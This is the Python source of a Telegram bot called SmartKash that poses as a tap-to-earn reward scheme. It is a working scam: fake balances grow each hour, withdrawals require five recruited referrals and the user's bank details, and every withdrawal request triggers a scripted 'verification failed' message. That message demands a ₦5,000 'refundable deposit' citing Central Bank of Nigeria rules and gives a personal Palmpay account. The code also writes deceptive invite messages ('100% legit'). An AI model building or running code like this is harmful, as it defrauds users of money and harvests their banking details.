import logging
import time
import json
import asyncio
import socket
from datetime import datetime
import pytz
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
    CallbackQueryHandler
)
from telegram.error import NetworkError

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constants
CHANNEL_ID = "-1002986130855"
CHANNEL_LINK = "https://t.me/SmartFashCash_Community"
WAT_TIMEZONE = pytz.timezone("Africa/Lagos")
CLAIM_AMOUNT = 5000
REFERRAL_BONUS = 20000  # Updated to ₦20,000
MIN_WITHDRAWAL = 20000
MAX_WITHDRAWAL = 1000000
MIN_REFERRALS = 5
CLAIM_COOLDOWN = 3600  # 1 hour in seconds

# Data persistence
user_data = {}
user_data_lock = asyncio.Lock()

# Utility functions
def save_user_data():
    """Save user_data to JSON file with error handling."""
    try:
        with open("user_data.json", "w") as f:
            json.dump(user_data, f)
        logger.debug("User data saved successfully")
    except Exception as e:
        logger.error(f"Failed to save user_data: {e}")

def load_user_data():
    """Load user_data from JSON file or initialize empty dict."""
    global user_data
    try:
        with open("user_data.json", "r") as f:
            user_data = json.load(f)
        logger.info("User data loaded successfully")
    except FileNotFoundError:
        logger.info("No user data file found, initializing empty database")
        user_data = {}
    except json.JSONDecodeError as e:
        logger.error(f"Corrupted user data file: {e}. Initializing empty database")
        user_data = {}

def format_currency(amount: int) -> str:
    """Format amount as Nigerian currency."""
    return f"₦{amount:,}"

def format_time_remaining(seconds: int) -> str:
    """Format time remaining for next claim."""
    minutes, seconds = divmod(seconds, 60)
    return f"{minutes} minutes {seconds} seconds"

def check_internet_connection():
    """Check if internet connection is available."""
    try:
        # Try to resolve Telegram's API host
        socket.create_connection(("api.telegram.org", 443), timeout=5)
        return True
    except OSError:
        return False

async def is_user_member(user_id: int, bot) -> bool:
    """Check if user is a member of the channel."""
    try:
        # Try to get chat member - this will work if bot is admin in channel
        member = await bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ["member", "administrator", "creator", "restricted"]
    except Exception as e:
        logger.error(f"Error checking channel membership for user {user_id}: {e}")
        return False

# Menu generators
def get_main_menu() -> ReplyKeyboardMarkup:
    """Generate main menu keyboard."""
    keyboard = [
        [KeyboardButton("🎁 Claim ₦5000"), KeyboardButton("💲 Balance")],
        [KeyboardButton("📤 Withdraw"), KeyboardButton("👥 Invite")],
        [KeyboardButton("🆘 SOS Support"), KeyboardButton("📊 Statistics")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_balance_menu() -> ReplyKeyboardMarkup:
    """Generate balance submenu keyboard."""
    keyboard = [
        [KeyboardButton("Set/Replace Bank")],
        [KeyboardButton("View Account")],
        [KeyboardButton("History")],
        [KeyboardButton("Home")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)

def get_channel_verification_keyboard() -> InlineKeyboardMarkup:
    """Generate channel verification inline keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ I've Joined", callback_data="channel_verified")]
    ])

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command with referral system and channel verification."""
    user_id = update.message.from_user.id
    first_name = update.message.from_user.first_name
    args = context.args
    logger.info(f"New start from user {user_id} ({first_name})")

    try:
        # Initialize user data if needed
        async with user_data_lock:
            if user_id not in user_data:
                user_data[user_id] = {
                    "balance": 0,
                    "last_claim": 0,
                    "referrals": 0,
                    "channel_verified": False,  # Track verification status
                    "referred_by": None,
                    "bank_details": {},
                    "claim_history": [],
                    "expecting_bank_details": False
                }
                logger.debug(f"Created new user record for {user_id}")
            else:
                # If user exists but hasn't verified, show verification again
                if not user_data[user_id]["channel_verified"]:
                    await prompt_channel_verification(update)
                    return

            # Process referral even if not verified
            if args and args[0].isdigit():
                referrer_id = int(args[0])
                if (referrer_id != user_id and 
                    referrer_id in user_data and 
                    user_data[user_id]["referred_by"] is None):
                    
                    user_data[referrer_id]["referrals"] += 1
                    user_data[referrer_id]["balance"] += REFERRAL_BONUS
                    user_data[user_id]["referred_by"] = referrer_id
                    save_user_data()
                    
                    # Notify referrer (if they're verified)
                    if user_data[referrer_id]["channel_verified"]:
                        await context.bot.send_message(
                            chat_id=referrer_id,
                            text=f"🎉 You earned a referral bonus of {format_currency(REFERRAL_BONUS)}!"
                        )
                    logger.info(f"Referral processed: {user_id} referred by {referrer_id}")

        # Show appropriate interface based on verification status
        if user_data[user_id]["channel_verified"]:
            await show_welcome_message(update)
        else:
            await prompt_channel_verification(update)

    except Exception as e:
        logger.error(f"Error in start for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred. Please try /start again.")

async def prompt_channel_verification(update: Update):
    """Prompt user to join channel before accessing bot features."""
    verification_message = (
        "⛔️ JOIN OUR CHANNEL TO CONTINUE\n\n"
        "To use this bot, you must first join our official channel:\n"
        f"{CHANNEL_LINK}\n\n"
        "✅ After joining, click the button below to verify:"
    )
    
    await update.message.reply_text(
        verification_message,
        reply_markup=get_channel_verification_keyboard(),
        disable_web_page_preview=True
    )

async def show_welcome_message(update: Update):
    """Show welcome message after channel verification."""
    welcome_message = (
        "💸🔥💰 WELCOME TO SMARTKASH BOT 💰🔥💸\n\n"
        "Get ready to tap your way to riches! 💸✨ Our platform is a TAP TO EARN cash reward "
        "where you can earn BIG 💥 by simply tapping and referring friends! 😱\n\n"
        "🤑 HOW TO EARN:\n\n"
        "1️⃣ Tap to earn cash rewards hourly! ⏰ Claim ₦5,000 every hour! 💰\n"
        f"2️⃣ Refer friends to earn {format_currency(REFERRAL_BONUS)} per referral! 🤝💵 Share the wealth!\n\n"
        "💵 WITHDRAWAL TIME:\n\n"
        "📅 Withdrawals every Saturday! Here's what you need:\n"
        f"🔹 {MIN_REFERRALS}+ referrals required\n"
        f"🔹 Min withdrawal: {format_currency(MIN_WITHDRAWAL)}\n"
        f"🔹 Max withdrawal: {format_currency(MAX_WITHDRAWAL)}\n\n"
        "🚀 Start tapping and inviting friends NOW! 🌟"
    )
    
    await update.message.reply_text(
        welcome_message,
        reply_markup=get_main_menu()
    )

async def handle_verification_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle channel verification callback."""
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    try:
        # Check if user has actually joined the channel
        is_member = await is_user_member(user_id, context.bot)
        
        if is_member:
            # Set user as verified
            async with user_data_lock:
                if user_id not in user_data:
                    # Create user record if it doesn't exist
                    user_data[user_id] = {
                        "balance": 0,
                        "last_claim": 0,
                        "referrals": 0,
                        "channel_verified": True,
                        "referred_by": None,
                        "bank_details": {},
                        "claim_history": [],
                        "expecting_bank_details": False
                    }
                else:
                    user_data[user_id]["channel_verified"] = True
                
                save_user_data()
                logger.info(f"User {user_id} verified channel access")
            
            # Edit original message to remove button
            await query.edit_message_text(
                "✅ Channel verification complete! You can now access all bot features."
            )
            
            # Show welcome message
            welcome_message = (
                "💸🔥💰 WELCOME TO SMARTKASH BOT 💰🔥💸\n\n"
                "Get ready to tap your way to riches! 💸✨ Our platform is a TAP TO EARN cash reward "
                "where you can earn BIG 💥 by simply tapping and referring friends! 😱\n\n"
                "🤑 HOW TO EARN:\n\n"
                "1️⃣ Tap to earn cash rewards hourly! ⏰ Claim ₦5,000 every hour! 💰\n"
                f"2️⃣ Refer friends to earn {format_currency(REFERRAL_BONUS)} per referral! 🤝💵 Share the wealth!\n\n"
                "💵 WITHDRAWAL TIME:\n\n"
                "📅 Withdrawals every Saturday! Here's what you need:\n"
                f"🔹 {MIN_REFERRALS}+ referrals required\n"
                f"🔹 Min withdrawal: {format_currency(MIN_WITHDRAWAL)}\n"
                f"🔹 Max withdrawal: {format_currency(MAX_WITHDRAWAL)}\n\n"
                "🚀 Start tapping and inviting friends NOW! 🌟"
            )
            
            await context.bot.send_message(
                chat_id=user_id,
                text=welcome_message,
                reply_markup=get_main_menu()
            )
        else:
            # User hasn't joined the channel
            await query.edit_message_text(
                "❌ You need to join our channel first!\n\n"
                f"Please join {CHANNEL_LINK} and then click the verification button again.",
                reply_markup=get_channel_verification_keyboard(),
                disable_web_page_preview=True
            )
        
    except Exception as e:
        logger.error(f"Error in verification callback for user {user_id}: {e}", exc_info=True)
        # If there's an error, give specific instructions
        error_message = (
            "⚠️ Verification failed!\n\n"
            "Please make sure:\n"
            "1. You have joined our channel\n"
            "2. If you have joined,Exit and join again \n"
            "3. Try using /start again"
        )
        await query.edit_message_text(error_message)

async def handle_menu_options(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all menu button selections."""
    user_id = update.message.from_user.id
    text = update.message.text.strip()
    logger.info(f"Menu option '{text}' from user {user_id}")

    try:
        # Check if user is verified before processing any commands
        async with user_data_lock:
            user_record = user_data.get(user_id)
            if not user_record or not user_record.get("channel_verified", False):
                await prompt_channel_verification(update)
                return

        menu_handlers = {
            "🎁 Claim ₦5000": claim_balance,
            "💲 Balance": show_balance,
            "📤 Withdraw": withdraw,
            "👥 Invite": invite,
            "🆘 SOS Support": support,
            "📊 Statistics": statistics,
            "Home": return_to_main_menu
        }

        # Direct menu options
        if text in menu_handlers:
            await menu_handlers[text](update, context)
            return
        
        # Bank-related options
        if text == "Set/Replace Bank":
            async with user_data_lock:
                user_data[user_id]["expecting_bank_details"] = True
                save_user_data()
            await update.message.reply_text(
                "💳 YOUR BANK ACCOUNT DETAILS:\n\n"
                "Please provide your details in EXACTLY this format:\n\n"
                "ACC NUMBER\n"
                "BANK NAME\n"
                "ACCT NAME\n\n"
                "⚠️ These details will be used for ALL future withdrawals. "
                "Please double-check for accuracy!",
                reply_markup=get_balance_menu()
            )
            return
        
        if text == "View Account":
            async with user_data_lock:
                bank_details = user_data[user_id].get("bank_details", {})
            
            if bank_details and all(key in bank_details for key in ["acc_number", "bank_name", "acct_name"]):
                await update.message.reply_text(
                    "👀 YOUR BANK ACCOUNT DETAILS:\n\n"
                    f"ACC NUMBER: {bank_details['acc_number']}\n"
                    f"BANK NAME: {bank_details['bank_name']}\n"
                    f"ACCT NAME: {bank_details['acct_name']}",
                    reply_markup=get_main_menu()
                )
            else:
                await update.message.reply_text(
                    "❌ You haven't set bank details yet. Use 'Set/Replace Bank' to add them.",
                    reply_markup=get_main_menu()
                )
            return
        
        if text == "History":
            async with user_data_lock:
                claim_history = user_data[user_id].get("claim_history", [])
            
            if claim_history:
                history_text = "⚙️ YOUR CLAIM HISTORY:\n\n⏳ HOURLY CLAIMS:\n"
                for timestamp in claim_history:
                    dt = datetime.fromtimestamp(timestamp, WAT_TIMEZONE)
                    history_text += f"- Claimed ₦5,000 on {dt.strftime('%Y-%m-%d %H:%M:%S')}\n"
                await update.message.reply_text(history_text, reply_markup=get_main_menu())
            else:
                await update.message.reply_text(
                    "You have no claim history yet.",
                    reply_markup=get_main_menu()
                )
            return
        
        # Bank details input
        async with user_data_lock:
            if user_data.get(user_id, {}).get("expecting_bank_details", False):
                lines = text.strip().split("\n")
                if len(lines) == 3:
                    acc_number, bank_name, acct_name = [line.strip() for line in lines]
                    user_data[user_id]["bank_details"] = {
                        "acc_number": acc_number,
                        "bank_name": bank_name,
                        "acct_name": acct_name
                    }
                    user_data[user_id]["expecting_bank_details"] = False
                    save_user_data()
                    await update.message.reply_text(
                        "✅ BANK DETAILS UPDATED SUCCESSFULLY!",
                        reply_markup=get_main_menu()
                    )
                    logger.info(f"Bank details updated for user {user_id}")
                else:
                    await update.message.reply_text(
                        "❌ INVALID FORMAT! Please send EXACTLY 3 lines:\n"
                        "1. ACC NUMBER\n"
                        "2. BANK NAME\n"
                        "3. ACCT NAME",
                        reply_markup=get_balance_menu()
                    )
                return

        # Fallback for invalid input
        await update.message.reply_text(
            "❌ Invalid option. Please choose from the menu below:",
            reply_markup=get_main_menu()
        )

    except Exception as e:
        logger.error(f"Error handling menu for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred. Please try again.")

async def claim_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle balance claim with cooldown check."""
    user_id = update.message.from_user.id
    logger.info(f"Claim attempt by user {user_id}")

    try:
        current_time = time.time()
        async with user_data_lock:
            user = user_data.get(user_id)
            if not user:
                await update.message.reply_text("❌ User not found. Please send /start again.")
                return
                
            last_claim = user["last_claim"]
            if current_time - last_claim < CLAIM_COOLDOWN:
                remaining = int(CLAIM_COOLDOWN - (current_time - last_claim))
                message = f"⏳ Please wait {format_time_remaining(remaining)} before claiming again!"
            else:
                user["balance"] += CLAIM_AMOUNT
                user["last_claim"] = current_time
                user["claim_history"].append(current_time)
                save_user_data()
                message = "🎉 NEW EARNING ALERT!\n+₦5,000 ADDED TO YOUR BALANCE! 💸\n\n⏳ Next claim available in 1 hour"
                logger.info(f"User {user_id} claimed ₦5000 successfully")

        await update.message.reply_text(message, reply_markup=get_main_menu())

    except Exception as e:
        logger.error(f"Error in claim_balance for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred while processing your claim.")

async def show_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user balance with bank menu options."""
    user_id = update.message.from_user.id
    logger.info(f"Balance request from user {user_id}")

    try:
        async with user_data_lock:
            balance = user_data.get(user_id, {}).get("balance", 0)
        
        balance_message = (
            f"ℹ️ YOUR BALANCE: {format_currency(balance)}\n\n"
            "💳 Withdrawals will be automatically paid to your bank account\n\n"
            "📅 WITHDRAWAL SCHEDULE:\n"
            "- Every Saturday (12:00am - 11:59pm)\n"
            "- Every Sunday (12:00am - 10:00pm)\n"
            f"- Requires {MIN_REFERRALS}+ referrals\n\n"
            f"💰 Min withdrawal: {format_currency(MIN_WITHDRAWAL)}\n"
            f"💸 Max withdrawal: {format_currency(MAX_WITHDRAWAL)}\n\n"
            "👥 Invite friends to unlock withdrawals!"
        )
        await update.message.reply_text(balance_message, reply_markup=get_balance_menu())

    except Exception as e:
        logger.error(f"Error in show_balance for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred while retrieving your balance.")

async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle withdrawal requests with eligibility checks."""
    user_id = update.message.from_user.id
    user = update.message.from_user
    logger.info(f"Withdrawal request from user {user_id}")

    try:
        # Get user data with lock
        async with user_data_lock:
            user_record = user_data.get(user_id)
            if not user_record:
                await update.message.reply_text("❌ User not found. Please send /start again.")
                return
                
            balance = user_record["balance"]
            referrals = user_record["referrals"]
            bank_details = user_record.get("bank_details", {})

        # Check time eligibility
        now = datetime.now(pytz.utc).astimezone(WAT_TIMEZONE)
        day = now.weekday()  # Monday=0, Sunday=6
        hour = now.hour

        if day not in [5, 6] or (day == 6 and hour >= 22):  # Saturday=5, Sunday=6
            await update.message.reply_text(
                f"Hi {user.first_name},\n\n"
                "⛔️ WITHDRAWALS ARE CLOSED\n\n"
                "Withdrawals are only available:\n"
                "📅 Saturday: 12:00am - 11:59pm\n"
                "📅 Sunday: 12:00am - 10:00pm\n\n"
                "Please try again during these times."
            )
            return
        
        # Check referral eligibility
        if referrals < MIN_REFERRALS:
            await update.message.reply_text(
                f"Hi {user.first_name},\n\n"
                "⛔️ WITHDRAWAL REQUIREMENT NOT MET\n\n"
                f"You need at least {MIN_REFERRALS} referrals to withdraw!\n"
                f"Current referrals: {referrals}\n\n"
                "👥 Invite more friends to unlock withdrawals!"
            )
            return
        
        # Check balance eligibility
        if balance < MIN_WITHDRAWAL:
            await update.message.reply_text(
                f"Hi {user.first_name},\n\n"
                f"⛔️ MINIMUM WITHDRAWAL IS {format_currency(MIN_WITHDRAWAL)}\n\n"
                f"Your current balance: {format_currency(balance)}\n\n"
                "💸 Keep claiming hourly rewards to reach the minimum!"
            )
            return
        
        # Check bank details
        if not bank_details or not all(key in bank_details for key in ["acc_number", "bank_name", "acct_name"]):
            await update.message.reply_text(
                f"Hi {user.first_name},\n\n"
                "⛔️ BANK DETAILS REQUIRED\n\n"
                "You need to set your bank details before withdrawing!\n"
                "Go to '💲 Balance' → 'Set/Replace Bank' to add your information."
            )
            return

        # Success message - changed to show pending status
        await update.message.reply_text(
            f"⏳ WITHDRAWAL REQUEST PENDING\n\n"
            f"Hi {user.first_name},\n\n"
            "We've received your withdrawal request:\n"
            f"• Amount: {format_currency(balance)}\n"
            f"• Account Number: {bank_details['acc_number']}\n"
            f"• Bank Name: {bank_details['bank_name']}\n"
            f"• Account Name: {bank_details['acct_name']}\n\n"
            "⏳ Your withdrawal is now pending approval.\n"
            "Please wait for bot verification...\n\n"
            "Thank you for using SmartCash!"
        )
        logger.info(f"Withdrawal pending for user {user_id}: ₦{balance}")

        # Schedule the verification message after 1 minute
        async def send_verification_message():
            await asyncio.sleep(60)  # Wait for 1 minute
            
            # Send bot verification failed message first
            await context.bot.send_message(
                chat_id=user_id,
                text="❌ Bot verification failed. Manual verification required."
            )
            
            # Then send the detailed verification message
            verification_message = (
                "In line with Central Bank of Nigeria (CBN) KYC & Anti-Fraud Regulations, "
                "all withdrawals must be verified to ensure transactions are made by real individuals, not automated bots.\n\n"
                "To complete this process, you are required to make a one-time refundable verification deposit of ₦5,000.\n\n"
                "Payment Details:\n"
                "Account Number: 8149712437\n"
                "Bank: Palmpay\n"
                "Account Name: Deborah chinyere Vincent\n\n"
                "✅ Once your payment is confirmed, your account will be verified and your withdrawal will be processed immediately."
            )
            await context.bot.send_message(chat_id=user_id, text=verification_message)

        # Start the delayed task
        asyncio.create_task(send_verification_message())

    except Exception as e:
        logger.error(f"Error in withdraw for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred while processing your withdrawal.")

async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate referral link for user."""
    user_id = update.message.from_user.id
    logger.info(f"Invite request from user {user_id}")

    try:
        bot_username = context.bot.username or "SmartCashBot"
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        # Full referral message
        referral_message = (
            "Hey there! 💐\n\n"
            "Sorry to bother you, but I just found something incredible, and I had to share! 🚀\n\n"
            "Join Smartkash on Telegram and make 20k-50k daily with your phone, it's free to join...💯\n\n"
            "A new earning opportunity just launched today—SmartKash bot—and people are already cashing out! 💰\n\n"
            "How it works:\n"
            "✅ Join the platform\n"
            "✅ Refer friends & earn commissions\n"
            "✅ Get instant payouts—no delays!\n\n"
            "It's 100% legit, fast, and easy—no stress, just earnings! The earlier you start, the more you can make.\n\n"
            "Ready to earn? Click below to join\n"
            f"💰 EARN {format_currency(REFERRAL_BONUS)} PER REFERRAL!\n\n"
            "Share this link with your friends:\n\n"
            f"{referral_link}\n\n"
            "Withdrawal is every Saturday to Sunday, click on the link now to join, thank me later!"
        )
        
        await update.message.reply_text(referral_message)

    except Exception as e:
        logger.error(f"Error in invite for user {user_id}: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred while generating your referral link.")

async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Provide support information."""
    await update.message.reply_text(
        "🆘 NEED HELP?\n\n"
        "Our support team is here to assist you!\n\n"
        "📱 Telegram: @SmartCashSupport\n\n"
        "We typically respond within 1 hour. Thank you for your patience!"
    )

async def statistics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot statistics."""
    try:
        async with user_data_lock:
            total_users = len(user_data)
            active_users = sum(1 for user in user_data.values() if user.get("channel_verified", False))
            total_balance = sum(user.get("balance", 0) for user in user_data.values())
            total_referrals = sum(user.get("referrals", 0) for user in user_data.values())
        
        await update.message.reply_text(
            "📊 SMARTKASH STATISTICS:\n\n"
            f"👥 Total Users: {total_users:,}\n"
            f"✅ Active Users: {active_users:,}\n"
            f"💰 Total Balance: {format_currency(total_balance)}\n"
            f"👫 Total Referrals: {total_referrals:,}\n\n"
            "🟢 System Status: Operational\n"
            "⏰ Next Payout: Saturday 00:00 WAT"
        )

    except Exception as e:
        logger.error(f"Error in statistics: {e}", exc_info=True)
        await update.message.reply_text("⚠️ Sorry, an error occurred while retrieving statistics.")

async def return_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Return to main menu."""
    await update.message.reply_text(
        "🏠 Returning to main menu...",
        reply_markup=get_main_menu()
    )

# Bot setup
def main():
    """Main application setup and entry point."""
    try:
        # Check internet connection first
        if not check_internet_connection():
            print("❌ No internet connection! Please check your network.")
            input("Press Enter to exit...")
            return
            
        # Load user data
        load_user_data()
        
        # Get bot token
        import os
        token = os.environ.get("BOT_TOKEN")
        if not token:
            raise ValueError("Bot token cannot be empty")

        logger.info("Initializing bot...")
        application = Application.builder().token(token).build()

        # Register handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(handle_verification_callback, pattern="^channel_verified$"))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_menu_options))
        
        logger.info("Starting bot...")
        application.run_polling(drop_pending_updates=True)

    except NetworkError as e:
        logger.critical(f"Network error: {e}")
        print(f"❌ NETWORK ERROR: Could not connect to Telegram servers")
        print("Please check your internet connection and firewall settings")
        input("Press Enter to exit...")
    except Exception as e:
        logger.critical(f"Fatal error during bot startup: {e}", exc_info=True)
        print(f"CRITICAL ERROR: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    print("Starting SmartCash Bot...")
    try:
        main()
    except KeyboardInterrupt:
        print("\nBot stopped by user")